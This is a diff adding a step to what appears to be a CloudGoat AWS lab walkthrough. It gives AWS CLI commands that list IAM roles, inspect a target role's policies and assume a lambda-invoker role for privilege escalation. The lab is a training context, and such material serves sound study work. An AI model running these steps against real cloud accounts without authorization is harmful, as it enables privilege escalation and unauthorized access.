@@ -213,3 +213,17 @@ aws --profile bilbo --region us-east-1 iam get-user-policy --user-name [your_use
 <p align="center">
   <img src="/images/cloud/vullam1.png">
 </p>
+
+* List all roles, assume a role for privesc.
+
+```bash
+#This command will list all the roles in your account, one of which should be assumable. 
+aws --profile bilbo --region us-east-1 iam list-roles | grep cg-
+# This command will list all policies for the target role
+aws --profile bilbo --region us-east-1 iam list-role-policies --role-name [cg-target-role]
+# This command will get you credentials for the cloudgoat role that can invoke lambdas.
+aws --profile bilbo --region us-east-1 sts assume-role --role-arn [cg-lambda-invoker_arn] --role-session-name [whatever_you_want_here]
+```
+<p align="center">
+  <img src="/images/cloud/vullam2.png">
+</p>
